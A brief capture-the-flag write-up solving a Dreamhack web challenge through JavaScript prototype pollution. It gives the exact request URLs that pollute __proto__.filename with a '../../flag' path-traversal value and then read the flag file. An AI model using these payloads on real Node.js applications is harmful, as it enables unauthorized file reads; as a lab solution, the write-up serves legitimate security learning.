
# filestorage
This challenge involves js prototype polluting

- `/test?func=reset` reset `read` object
- `/test?func=rename&filename=filename&rename=newname` set `file[filename]=newname` + vulnerable to prototype polluting: `__proto__.filename = anything`
- `/read?filename=filename` to read filename

## Solve
Since `read[filename] = fake` when we access `/`, let's clean it so when called it revert back to prototype chain and use our polluted method.
```
http://host3.dreamhack.games:12076/test?func=reset
``` 

Read file using the first if clause (don't have `.` trim) by polluting `read`'s **filename** method: => **read[filename] == ../../flag**
```
http://host3.dreamhack.games:12076/test?func=rename&filename=__proto__.filename&rename=../../flag
```

Get the flag by fetching `/readfile` with non-exist filename to make filename==null and trigger first if clause:
![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/bfe06548c889a595355b5567a2d151c4cb0040c94a921cfb78ea14aa9701ac8f.png)
